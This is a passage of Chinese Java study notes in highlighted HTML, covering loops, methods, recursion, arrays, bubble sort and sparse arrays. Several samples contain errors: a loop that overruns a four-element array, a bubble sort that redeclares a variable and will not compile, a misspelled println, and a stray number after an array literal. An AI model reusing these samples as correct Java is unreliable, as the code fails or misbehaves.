class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>            <span class="hljs-keyword">for</span>( j=<span class="hljs-number">1</span>;j&lt;=i;j++)&#123;<br>                System.out.print(j+<span class="hljs-string">&quot;*&quot;</span>+i+<span class="hljs-string">&quot;=&quot;</span>+(i*j)+ <span class="hljs-string">&quot;\t&quot;</span>);<br>            &#125;<br>            System.out.println();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>增强for循环：</p><p>for(声明语句：表达式){</p><p>}</p><p>声明语句：声明新的局部变量，该变量的类型必须与数组元素的类型匹配</p><p>表达式：要访问的数组名，或者是返回值是数组的方法</p><p><strong>之后数组重点使用</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.struct;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[] numbers=&#123;<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>&#125;;<span class="hljs-comment">//定义一个数组</span><br><br>        <span class="hljs-comment">//遍历数组元素 增强for循环</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x:numbers) &#123;<br>            System.out.println(x);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;=======&quot;</span>);<br><br>        <span class="hljs-comment">//等同于以下for循环</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">5</span>;i++)&#123;<br>            System.out.println(numbers[i]);<br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ul></li></ul><hr><p><strong>小练习打印三角形</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.struct;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">5</span>;i++)&#123;<br>            <span class="hljs-comment">//分割成三部分打印</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">5</span>;j&gt;i;j--)&#123;<br>                System.out.print(<span class="hljs-string">&quot;*&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=i;j++)&#123;<br>                System.out.print(<span class="hljs-string">&quot;~&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;i;j++)&#123;<br>               System.out.print(<span class="hljs-string">&quot;^&quot;</span>);<br>            &#125;<br>            System.out.println();<br>        &#125;<br>   <br>&#125;<br><span class="hljs-comment">/*结果，</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">****~</span><br><span class="hljs-comment">***~~^</span><br><span class="hljs-comment">**~~~^^</span><br><span class="hljs-comment">*~~~~^^^</span><br><span class="hljs-comment">~~~~~^^^^</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">将内层第一个for换成空格，第二三个for换成*，即可打印出三角形</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>类似c的函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//eg:</span><br>System.out.prinntln()<br><span class="hljs-comment">//类   对象   方法</span><br></code></pre></td></tr></table></figure><p><strong>设计方法的原则：</strong>一个方法只完成一个功能，有利于后期去扩展</p><p><strong>方法命名规则：</strong> 首字母小写+驼峰</p><p><strong>方法的定义：</strong> 修饰符 返回类型 方法名（参数类型 参数名）</p><ul><li>修饰符：可选，告诉编译器如何调用该方法，定义了该方法的访问类型</li></ul><p><strong>方法的调用</strong>：对象名.方法名（实参列表）</p><p><strong>方法的重载</strong>：</p><p>在一个类中有相同的函数名，但形参不同的函数（<u><em>调用时根据参数类型不同调用）</em></u></p><ul><li>重载规则：</li><li>方法名称必须相同</li><li>参数列表必须不同（个数或类型不同或参数排列顺序不同）</li><li>方法返回类型可以相同也可以不同（重点在于参数那块不同）</li><li>仅仅返回类型不同不足以成为方法重载</li></ul><h3 id="命令行传参"><a href="#命令行传参" class="headerlink" title="命令行传参"></a>命令行传参</h3><ul><li><p>cmd窗口先编译成Dome01.class(命令：javac Dome01.java)</p><p>执行编译文件时注意要加上包名，找对路径（在src目录下执行java xxx.xxx.xxx.Dome01 传参）</p></li></ul><h3 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h3><p>本质是数组</p><ul><li>在方法声明中，在指定参数类型后加一个省略号…</li><li>一个方法中只能指定一个可变参数，<strong>它必须是方法的最后一个参数</strong></li></ul><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//阶乘</span><br><span class="hljs-keyword">package</span> com.zhang.method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> b=<span class="hljs-number">4</span>;<br>        System.out.println(f(b));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span>&#123;<br>        <span class="hljs-keyword">if</span> (a==<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> a*f(a-<span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p><strong>声明：</strong></p><ul><li>int[] array1; 首选方法</li><li>int array1[];</li></ul><p><strong>开辟空间</strong>：array1&#x3D;new int [10] ;</p><p>—–&gt;int[] array2&#x3D;new int[10];</p><p>首先在栈里创建对象，new:在堆里开辟内存空间，在堆里赋值</p><h4 id="初始化："><a href="#初始化：" class="headerlink" title="初始化："></a><strong>初始化：</strong></h4><ul><li><p>静态初始化：创建以后不可更改</p><p>int[] a&#x3D;{1,2,3,4,5};</p><p>静态初始化是在声明数组的同时为数组元素赋值。语法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 语法</span><br>type[] arrayName = &#123;value1, value2, value3,...&#125;;<br><br><span class="hljs-comment">// 示例</span><br><span class="hljs-type">int</span>[] numbers = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>String[] fruits = &#123;<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;banana&quot;</span>, <span class="hljs-string">&quot;cherry&quot;</span>&#125;;<br></code></pre></td></tr></table></figure><p>在静态初始化中，数组的大小由花括号内元素的个数自动确定，不需要显式指定。</p></li><li><p>动态初始化：(包含默认初始化)</p><p>int[] b&#x3D;new int [10];</p><p>动态初始化是先声明数组，然后在后续代码中使用 <code>new</code> 关键字为数组分配内存空间并指定数组的大小</p><p><strong>初始化</strong></p><p>不同的数据类型在初始化是会有不同的默认值：</p><ul><li><p>数值类型：0</p></li><li><p>布尔类型：false</p></li><li><p>引用类型（即除基本类型外的）：null</p><p><strong>数组默认初始化</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 数值类型数组</span><br><span class="hljs-type">int</span>[] intArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>];<br><span class="hljs-comment">// 数组元素默认值为 0，依次为：0, 0, 0</span><br><br><span class="hljs-comment">// 布尔类型数组</span><br><span class="hljs-type">boolean</span>[] booleanArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">2</span>];<br><span class="hljs-comment">// 数组元素默认值为 false，依次为：false, false</span><br><br><span class="hljs-comment">// 引用类型数组</span><br>String[] stringArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">4</span>];<br><span class="hljs-comment">// 数组元素默认值为 null，依次为：null, null, null, null</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><hr><p><strong>数组特点</strong>：</p><ul><li>数组是<strong>相同类型</strong>的有序集合，其中的元素可以是任何类型的，包括基本类型和引用类型</li><li>数组也是对象，数组元素相当于对象的成员变量</li><li>数组长度是不可变的</li></ul><h4 id="增强for循环："><a href="#增强for循环：" class="headerlink" title="增强for循环："></a><strong>增强for循环：</strong></h4><p>适合打印输出，不适合操作元素</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.array;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[] arrays=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> array : arrays) &#123;<br>            System.out.println(array);<br><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>数组作为方法的参数和返回值</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.array;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[] arrays=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br><br>        printArrays(arrays);<br>        <span class="hljs-type">int</span>[]res=reverseArrays(arrays);<br>        printArrays(res);<br><br>    &#125;<br>    <span class="hljs-comment">//打印数组                      数组为参数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printArrays</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arrays)</span> &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arrays.length;i++)&#123;<br>            System.out.println(arrays[i]);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">//逆序数组     数组为返回值时，创建新数组作为返回数组</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[] reverseArrays(<span class="hljs-type">int</span>[] arrays) &#123;<br>        <span class="hljs-comment">//创建新数组作为结果</span><br>        <span class="hljs-type">int</span>[] result=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[arrays.length];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=arrays.length-<span class="hljs-number">1</span>;i&lt;arrays.length;i++,j--)&#123;<br>            result[j]=arrays[i];<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><hr><p><strong>多维数组</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.array;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[][] array1=&#123;&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;,&#123;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;,&#123;<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;,&#123;<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>&#125;&#125;;<span class="hljs-number">4</span><br>        System.out.println(array1.length);<span class="hljs-comment">//4 行的长度</span><br>        System.out.println(array1[<span class="hljs-number">0</span>].length);<span class="hljs-comment">//3 列的长度</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.array;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[][] array1=&#123;&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;,&#123;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;,&#123;<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;,&#123;<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>&#125;&#125;;<br>        <span class="hljs-comment">//for循环输出二维数组</span><br>       <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;array1.length;i++)&#123;<br>           <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;array1[i].length;j++)&#123;<br>               System.out.println(array1[i][j]);<br>           &#125;<br>       &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">array</span>s.length;i++)&#123;<br>    System.<span class="hljs-keyword">out</span>.println(<span class="hljs-built_in">array</span>s[i]);<br>&#125;<br></code></pre></td></tr></table></figure><hr><p><strong>Arrays类</strong></p><p>Arrays类位于 java.util 包中，主要包含了操作数组的各种方法。</p><p>eg:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> arr[] = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;;<br>        <span class="hljs-comment">//将数组转化为字符串，此时输出结果为字符串类型</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">newArr</span> <span class="hljs-operator">=</span> Arrays.toString(arr);<br>        System.out.println(newArr);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a><strong>冒泡排序</strong></h4><ul><li><p>外层循环:最后一次循环肯定就剩一个数了，所以循环次数为：个数-1次    for(i&#x3D;0;   i&lt;arrar,length-1;i++)</p></li><li><p>内层循环</p><p>每次内层循环是从前（0或1）开始—-&gt;往后</p><p>接下来比较前后两个数并交换，后面的数if小就是小的数一直往后，if大就是大的数一直往后，最终内循环一次结束后，就可以确定出最后面的是最大值或最小值，下一轮需要比较的数的个数就少一个，内循环几次，下一次比较就可以少比较几个 所以 for(j&#x3D;0; j&lt;array.length-1-i;j++)</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] arrays=&#123;<span class="hljs-number">12</span>,<span class="hljs-number">34</span>,<span class="hljs-number">23</span>,<span class="hljs-number">44</span>,<span class="hljs-number">38</span>&#125;;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arrays.length-<span class="hljs-number">1</span>;i++)&#123;<br>            <span class="hljs-type">boolean</span> flag=<span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;arrays.length-<span class="hljs-number">1</span>-i;j++)&#123;<br>                <span class="hljs-keyword">if</span>(arrays[j+<span class="hljs-number">1</span>]&gt;arrays[j])&#123;<br>                    <span class="hljs-type">int</span> temp=arrays[j+<span class="hljs-number">1</span>];<br>                    arrays[j+<span class="hljs-number">1</span>]=arrays[j];<br>                    arrays[j]=temp;<br>                    <span class="hljs-type">boolean</span> flag=<span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arrays.length;i++)&#123;<br>            System.out.println(arrays[i]);<br>        &#125;<br></code></pre></td></tr></table></figure><h4 id="稀疏数组"><a href="#稀疏数组" class="headerlink" title="稀疏数组"></a><strong>稀疏数组</strong></h4><p>记录有效值及其行列</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.array;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome06</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建一个新的目标数组</span><br>        <span class="hljs-type">int</span>[][] arrays1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">11</span>][<span class="hljs-number">11</span>];<br>                arrays1[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]=<span class="hljs-number">1</span>;<br>                arrays1[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span>[] ants:arrays1)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> ents:ants)&#123;<br>                System.out.print(ents+<span class="hljs-string">&quot; &quot;</span>);<br>            &#125;<br>            System.out.println();<br>        &#125;<br><br>        <span class="hljs-comment">//统计有效值,为新建稀疏数组的行数做准备</span><br>        <span class="hljs-type">int</span> sum=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arrays1.length;i++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;arrays1[i].length;j++)&#123;<br>                <span class="hljs-keyword">if</span> (arrays1[i][j]!=<span class="hljs-number">0</span>)&#123;<br>                    sum++;<br>                &#125;<br>            &#125;<br>        &#125;<br>        System.out.println(sum);<br><br><br><br>        <span class="hljs-comment">//创建稀疏数组及它的第0行（第0行是  原数组的行数 列数   有效值）</span><br>        <span class="hljs-type">int</span>[][] arrays2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[sum+<span class="hljs-number">1</span>][<span class="hljs-number">3</span>];<br>        arrays2[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=arrays1.length;<br>        arrays2[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]=arrays1[<span class="hljs-number">0</span>].length;<br>        arrays2[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>]=sum;<br><br><br>        <span class="hljs-comment">//将有效值放入稀疏数组</span><br>        <span class="hljs-type">int</span> m=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;arrays1.length;i++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;arrays1[i].length;j++)&#123;<br>                <span class="hljs-keyword">if</span>(arrays1[i][j]!=<span class="hljs-number">0</span>)&#123;<br>                    m++;<br>                    arrays2[m][<span class="hljs-number">0</span>]=i;<br>                    arrays2[m][<span class="hljs-number">1</span>]=j;<br>                    arrays2[m][<span class="hljs-number">2</span>]=arrays1[i][j];<br>                &#125;<br>            &#125;<br>        &#125;<br><br><br><br><br>        <span class="hljs-comment">//打印稀疏数组</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span>[] ants: arrays2)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> ents:ants)&#123;<br>                System.out.print(ents+<span class="hljs-string">&quot; &quot;</span>);<br>            &#125;<br>            System.out.println();<br><br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="—————"><a href="#—————" class="headerlink" title="—————"></a>—————</h3><h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><p><strong>本质：</strong><br><u><em>以类的方式组织代码，以对象的组织（封装）数据</em></u></p><p><strong>三大特性：</strong></p><p>封装，继承，多态</p><p><strong>从代码的角度：</strong>先有类才有对象</p><hr><h4 id="回顾方法及加深"><a href="#回顾方法及加深" class="headerlink" title="回顾方法及加深"></a>回顾方法及加深</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop.dome01;<br><br><span class="hljs-keyword">public</span> <span 